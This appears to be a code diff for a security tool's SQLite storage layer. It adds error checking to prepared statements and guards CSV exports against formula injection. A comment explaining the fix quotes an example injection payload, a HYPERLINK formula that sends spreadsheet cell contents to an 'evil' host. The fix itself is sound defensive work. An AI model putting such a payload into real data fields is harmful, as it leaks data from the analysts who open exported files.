@@ -15,47 +15,59 @@ Storage::Storage(const std::string& db_path) {
     db_.reset(db_raw);
     
     exec_schema();
-    
-    sqlite3_stmt* stmt = nullptr;
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO events(ts, source, type, src_ip, user, severity) VALUES(?, ?, ?, ?, ?, ?)", -1, &stmt, nullptr);
-    insert_event_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO alerts(ts, rule, src_ip, severity, mitre, action, block_seconds, label) VALUES(?, ?, ?, ?, ?, ?, ?, ?)", -1, &stmt, nullptr);
-    insert_alert_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO actions(ts, src_ip, action, reason) VALUES(?, ?, ?, ?)", -1, &stmt, nullptr);
-    insert_action_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "SELECT a.ts, a.rule, a.src_ip, a.action, a.label, o.offense_count FROM alerts a LEFT JOIN offenders o ON a.src_ip = o.ip ORDER BY a.id DESC LIMIT ?", -1, &stmt, nullptr);
-    get_alerts_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO metrics(ts, dropped, passed, tcp, udp, icmp, other, syn_limit, xdp_mode) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)", -1, &stmt, nullptr);
-    insert_metrics_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "DELETE FROM metrics WHERE ts < ?", -1, &stmt, nullptr);
-    delete_metrics_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "SELECT offense_count, last_offense FROM offenders WHERE ip = ?", -1, &stmt, nullptr);
-    get_offense_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO offenders(ip, offense_count, last_offense) VALUES(?, 1, ?) ON CONFLICT(ip) DO UPDATE SET offense_count = offense_count + 1, last_offense = ?", -1, &stmt, nullptr);
-    record_offense_stmt_.reset(stmt);
-    
-    sqlite3_prepare_v2(db_.get(), "UPDATE offenders SET offense_count = 0 WHERE ip = ?", -1, &stmt, nullptr);
-    reset_offense_stmt_.reset(stmt);
 
-    sqlite3_prepare_v2(db_.get(), "INSERT INTO decisions(ts, ip, action, reason, rule, expires_at_unix, ttl_seconds, host) VALUES(datetime('now'), ?, ?, ?, ?, ?, ?, ?)", -1, &stmt, nullptr);
-    insert_decision_stmt_.reset(stmt);
+    // sqlite3_prepare_v2 can fail (e.g. a future migration forgetting a
+    // column/table), and an unchecked failure leaves the corresponding
+    // StmtPtr holding a null sqlite3_stmt* - which sqlite3_bind_text/
+    // sqlite3_reset in the matching method would then be handed directly,
+    // most likely crashing rather than failing with a clear error. This
+    // wrapper fails fast, at construction, with the actual sqlite error
+    // message instead.
+    auto prepare = [this](const char* sql) {
+        sqlite3_stmt* stmt = nullptr;
+        if (sqlite3_prepare_v2(db_.get(), sql, -1, &stmt, nullptr) != SQLITE_OK) {
+            throw std::runtime_error("failed to prepare statement: " +
+                                      std::string(sqlite3_errmsg(db_.get())) +
+                                      " (sql: " + std::string(sql) + ")");
+        }
+        return stmt;
+    };
+
+    insert_event_stmt_.reset(prepare(
+        "INSERT INTO events(ts, source, type, src_ip, user, severity) VALUES(?, ?, ?, ?, ?, ?)"));
+
+    insert_alert_stmt_.reset(prepare(
+        "INSERT INTO alerts(ts, rule, src_ip, severity, mitre, action, block_seconds, label) VALUES(?, ?, ?, ?, ?, ?, ?, ?)"));
+
+    insert_action_stmt_.reset(prepare(
+        "INSERT INTO actions(ts, src_ip, action, reason) VALUES(?, ?, ?, ?)"));
+
+    get_alerts_stmt_.reset(prepare(
+        "SELECT a.ts, a.rule, a.src_ip, a.action, a.label, o.offense_count FROM alerts a LEFT JOIN offenders o ON a.src_ip = o.ip ORDER BY a.id DESC LIMIT ?"));
+
+    insert_metrics_stmt_.reset(prepare(
+        "INSERT INTO metrics(ts, dropped, passed, tcp, udp, icmp, other, syn_limit, xdp_mode) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)"));
+
+    delete_metrics_stmt_.reset(prepare("DELETE FROM metrics WHERE ts < ?"));
+
+    get_offense_stmt_.reset(prepare(
+        "SELECT offense_count, last_offense FROM offenders WHERE ip = ?"));
+
+    record_offense_stmt_.reset(prepare(
+        "INSERT INTO offenders(ip, offense_count, last_offense) VALUES(?, 1, ?) ON CONFLICT(ip) DO UPDATE SET offense_count = offense_count + 1, last_offense = ?"));
+
+    reset_offense_stmt_.reset(prepare("UPDATE offenders SET offense_count = 0 WHERE ip = ?"));
+
+    insert_decision_stmt_.reset(prepare(
+        "INSERT INTO decisions(ts, ip, action, reason, rule, expires_at_unix, ttl_seconds, host) VALUES(datetime('now'), ?, ?, ?, ?, ?, ?, ?)"));
 
     // Latest row per IP wins; only a still-active "block" is served.
-    sqlite3_prepare_v2(db_.get(),
+    get_active_decisions_stmt_.reset(prepare(
         "SELECT ip, reason, rule, expires_at_unix, ttl_seconds, host FROM ("
         "  SELECT ip, action, reason, rule, expires_at_unix, ttl_seconds, host,"
         "         ROW_NUMBER() OVER (PARTITION BY ip ORDER BY id DESC) AS rn"
         "  FROM decisions"
-        ") WHERE rn = 1 AND action = 'block' AND (expires_at_unix = 0 OR expires_at_unix > ?)",
-        -1, &stmt, nullptr);
-    get_active_decisions_stmt_.reset(stmt);
+        ") WHERE rn = 1 AND action = 'block' AND (expires_at_unix = 0 OR expires_at_unix > ?)"));
 }
 
 void Storage::exec_schema() {
@@ -375,9 +387,28 @@ std::vector<Decision> Storage::get_active_decisions() {
 
 namespace {
 std::string csv_escape(const std::string& field) {
-    if (field.find_first_of(",\"\n\r") == std::string::npos) return field;
+    std::string value = field;
+
+    // Guard against CSV/formula injection (CWE-1236). Several export columns
+    // carry attacker-controlled strings - most notably events.user, which is
+    // the SSH username an attacker *attempted* to log in with (see
+    // SshDetector::handle_line in engine.cpp), accepted verbatim as long as
+    // it's non-whitespace. A crafted value like `=HYPERLINK("http://evil/?"
+    // &A1,"x")` would be evaluated as a formula if an analyst opens this
+    // CSV in Excel/LibreOffice/Sheets, which is exactly the forensics
+    // workflow GET /export exists to support. Prefixing with a single quote
+    // is the standard mitigation: spreadsheet applications then render the
+    // cell as literal text instead of evaluating it.
+    if (!value.empty()) {
+        char c0 = value.front();
+        if (c0 == '=' || c0 == '+' || c0 == '-' || c0 == '@' || c0 == '\t' || c0 == '\r') {
+            value = "'" + value;
+        }
+    }
+
+    if (value.find_first_of(",\"\n\r") == std::string::npos) return value;
     std::string escaped = "\"";
-    for (char c : field) {
+    for (char c : value) {
         if (c == '"') escaped += '"';
         escaped += c;
     }
